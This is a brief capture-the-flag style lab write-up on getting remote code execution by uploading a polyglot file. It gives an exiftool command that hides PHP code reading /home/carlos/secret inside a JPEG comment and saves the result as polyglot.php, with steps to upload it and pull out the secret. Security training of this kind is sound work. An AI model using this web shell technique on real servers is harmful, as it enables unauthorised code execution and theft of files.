Link: [Remote code execution via polyglot web shell upload]()
Difficulty: Practitioner

# Action 
A php script does not have a instrinsic character of a jpeg file. Therefore, with the help of `exiftool` which could help me draft the payload for this lab but first what is an exif format?

## EXIF ( Exchange File Format)
is a standard that saves hidden metadata inside digital photos, audio files, and scans.

With the help of `exiftool` I could write the intrinsic components which are necessary for a jpeg file.
First I need to have a jpeg image first which I save as `67.jpg`

Then with this command, the payload is ready
```
exiftool -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>" 67.jpg -o polyglot.php
```

So the tool will embed a malicious script called comment into the file among all the dimensions, metadata type, etc.

Next, up load the `polyglot.php` into the server and view the image. Furthermore, by searching for `START` and  `END`, the secret is found.

Happy Hacking!@$#!@
